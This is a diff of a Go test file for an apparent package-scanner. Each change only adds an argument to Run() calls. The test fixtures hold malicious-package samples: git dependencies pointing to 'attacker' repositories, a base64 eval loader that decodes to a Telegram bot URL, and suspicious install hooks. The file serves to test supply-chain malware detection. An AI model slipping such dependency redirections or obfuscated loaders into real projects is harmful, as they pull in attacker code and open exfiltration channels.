@@ -335,7 +335,7 @@ build = "build.rs"`),
 				"src/lib.rs": []byte(`pub fn add(a: i32, b: i32) -> i32 { a + b }`),
 			},
 		}
-		caps := Run(domain.EcoCrates, "xrvrv", nil, src)
+		caps := Run(domain.EcoCrates, "xrvrv", "", nil, src)
 		if !hasCap(caps, domain.CapInstallHookSuspicious) {
 			t.Fatalf("want CapInstallHookSuspicious from build.rs, got %v", caps)
 		}
@@ -375,7 +375,7 @@ func TestIncidents_VCSDependency(t *testing.T) {
 				"requirements.txt": []byte("requests==2.31.0\nevil @ git+https://github.com/attacker/evil\n"),
 			},
 		}
-		caps := Run(domain.EcoPyPI, "victim-pkg", nil, src)
+		caps := Run(domain.EcoPyPI, "victim-pkg", "", nil, src)
 		if !hasCap(caps, domain.CapVCSDependency) {
 			t.Errorf("want CapVCSDependency for PyPI git+https dep, got %v", caps)
 		}
@@ -392,7 +392,7 @@ serde = { git = "https://github.com/attacker/serde", branch = "main" }
 `),
 			},
 		}
-		caps := Run(domain.EcoCrates, "victim", nil, src)
+		caps := Run(domain.EcoCrates, "victim", "", nil, src)
 		if !hasCap(caps, domain.CapVCSDependency) {
 			t.Errorf("want CapVCSDependency for Cargo git dep, got %v", caps)
 		}
@@ -406,7 +406,7 @@ gem "evil_gem", git: "https://github.com/attacker/evil_gem"
 `),
 			},
 		}
-		caps := Run(domain.EcoRubyGems, "victim-gem", nil, src)
+		caps := Run(domain.EcoRubyGems, "victim-gem", "", nil, src)
 		if !hasCap(caps, domain.CapVCSDependency) {
 			t.Errorf("want CapVCSDependency for RubyGems git dep, got %v", caps)
 		}
@@ -430,7 +430,7 @@ const h = eval(Buffer.from("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==", "base64")
 `),
 		},
 	}
-	caps := Run(domain.EcoNpm, "@solana/web3.js", nil, src)
+	caps := Run(domain.EcoNpm, "@solana/web3.js", "", nil, src)
 	if !hasCap(caps, domain.CapObfuscatedPayload) {
 		t.Errorf("want CapObfuscatedPayload (eval(Buffer.from('base64'))), got %v", caps)
 	}
@@ -522,7 +522,7 @@ func TestIncidents_NPM_MiniShaiHulud(t *testing.T) {
 	})
 
 	t.Run("Run() returns all four new capabilities", func(t *testing.T) {
-		caps := Run(domain.EcoNpm, "@tanstack/react-router", manifest, src)
+		caps := Run(domain.EcoNpm, "@tanstack/react-router", "", manifest, src)
 		for _, want := range []domain.Capability{
 			domain.CapGitDepInOptionalDep,
 			domain.CapInstallHookSuspicious,
